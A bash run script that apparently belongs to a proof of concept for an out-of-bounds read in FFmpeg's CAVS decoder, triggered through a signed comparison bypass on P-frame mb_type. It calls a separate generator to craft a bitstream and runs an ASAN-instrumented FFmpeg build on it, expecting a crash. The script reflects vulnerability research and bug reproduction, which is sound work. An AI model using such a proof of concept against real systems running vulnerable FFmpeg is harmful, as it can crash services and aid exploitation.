#!/bin/bash
# PoC run script for VULN 001: CAVS decoder OOB read in ff_cavs_partition_flags
# via P-frame mb_type signed comparison bypass.

set -e

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
FFMPEG="/data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg"
INPUT="$SCRIPT_DIR/vuln_001_input.cavs"
RESULT="$SCRIPT_DIR/vuln_001_result.txt"

echo "=== VULN 001 PoC: CAVS P-frame mb_type OOB read ==="
echo ""

# Step 1: Generate the crafted input file
echo "[*] Generating crafted CAVS bitstream..."
python3 "$SCRIPT_DIR/vuln_001_gen.py"
echo ""

# Step 2: Run FFmpeg with ASAN on the crafted file
echo "[*] Running FFmpeg on crafted input..."
echo "    Binary : $FFMPEG"
echo "    Input  : $INPUT"
echo ""

# Set ASAN options
export ASAN_OPTIONS="halt_on_error=1:abort_on_error=1:detect_leaks=0:symbolize=1"

# Run FFmpeg - expect crash/error due to OOB read
"$FFMPEG" \
    -nostdin \
    -hide_banner \
    -loglevel debug \
    -i "$INPUT" \
    -f null - 2>&1 || true

echo ""
echo "[*] FFmpeg exited with code: $?"
